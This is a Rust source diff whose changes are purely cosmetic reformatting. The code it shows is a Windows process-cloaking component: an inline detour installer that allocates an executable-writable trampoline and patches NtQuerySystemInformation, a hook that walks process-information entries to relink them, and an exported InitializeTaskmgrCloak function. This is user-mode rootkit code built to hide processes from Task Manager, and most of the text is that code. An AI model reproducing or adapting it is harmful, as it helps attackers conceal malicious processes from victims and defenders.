@@ -1,7 +1,20 @@
-#![allow(non_snake_case, non_camel_case_types, dead_code, unsafe_op_in_unsafe_fn, static_mut_refs)]
+#![allow(
+    non_snake_case,
+    non_camel_case_types,
+    dead_code,
+    unsafe_op_in_unsafe_fn,
+    static_mut_refs
+)]
+#![allow(
+    clippy::missing_safety_doc,
+    clippy::not_unsafe_ptr_arg_deref,
+    clippy::upper_case_acronyms,
+    clippy::too_many_arguments,
+    clippy::manual_c_str_literals
+)]
 
 use std::ffi::c_void;
-use std::ptr::{null_mut, copy_nonoverlapping};
+use std::ptr::{copy_nonoverlapping, null_mut};
 use std::sync::atomic::{AtomicBool, Ordering};
 
 type HANDLE = *mut c_void;
@@ -58,12 +71,27 @@ static HOOK_INSTALLED: AtomicBool = AtomicBool::new(false);
 unsafe extern "system" {
     fn GetModuleHandleA(lpModuleName: *const u8) -> HMODULE;
     fn GetProcAddress(hModule: HMODULE, lpProcName: *const u8) -> *mut c_void;
-    fn VirtualProtect(lpAddress: *mut c_void, dwSize: usize, flNewProtect: DWORD, lpflOldProtect: *mut DWORD) -> BOOL;
-    fn VirtualAlloc(lpAddress: *mut c_void, dwSize: usize, flAllocationType: DWORD, flProtect: DWORD) -> *mut c_void;
+    fn VirtualProtect(
+        lpAddress: *mut c_void,
+        dwSize: usize,
+        flNewProtect: DWORD,
+        lpflOldProtect: *mut DWORD,
+    ) -> BOOL;
+    fn VirtualAlloc(
+        lpAddress: *mut c_void,
+        dwSize: usize,
+        flAllocationType: DWORD,
+        flProtect: DWORD,
+    ) -> *mut c_void;
 }
 
 unsafe fn install_detour64(target: *mut c_void, detour: *mut c_void) -> *mut c_void {
-    let trampoline = VirtualAlloc(null_mut(), 64, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    let trampoline = VirtualAlloc(
+        null_mut(),
+        64,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE,
+    );
     if trampoline.is_null() {
         return null_mut();
     }
@@ -76,7 +104,11 @@ unsafe fn install_detour64(target: *mut c_void, detour: *mut c_void) -> *mut c_v
     jump_back[1] = 0x25;
     jump_back[2..6].copy_from_slice(&0u32.to_ne_bytes());
     jump_back[6..14].copy_from_slice(&(return_addr as u64).to_ne_bytes());
-    copy_nonoverlapping(jump_back.as_ptr(), (trampoline as usize + 14) as *mut u8, 14);
+    copy_nonoverlapping(
+        jump_back.as_ptr(),
+        (trampoline as usize + 14) as *mut u8,
+        14,
+    );
 
     let mut old_protect: DWORD = 0;
     VirtualProtect(target, 14, PAGE_EXECUTE_READWRITE, &mut old_protect);
@@ -123,7 +155,10 @@ unsafe extern "system" fn hook_nt_query_system_information(
         return_length,
     );
 
-    if status == STATUS_SUCCESS && system_information_class == SYSTEM_PROCESS_INFORMATION_CLASS && !system_information.is_null() {
+    if status == STATUS_SUCCESS
+        && system_information_class == SYSTEM_PROCESS_INFORMATION_CLASS
+        && !system_information.is_null()
+    {
         let mut current_ptr = system_information as *mut u8;
         let mut prev_entry: *mut SystemProcessInformation = null_mut();
 
@@ -196,7 +231,8 @@ pub unsafe extern "system" fn InitializeTaskmgrCloak() -> BOOL {
         return 0;
     }
 
-    ORIG_NT_QUERY_SYSTEM_INFORMATION = Some(std::mem::transmute::<*mut c_void, FnNtQuerySystemInformation>(tramp));
+    ORIG_NT_QUERY_SYSTEM_INFORMATION =
+        Some(std::mem::transmute::<*mut c_void, FnNtQuerySystemInformation>(tramp));
     1
 }
 
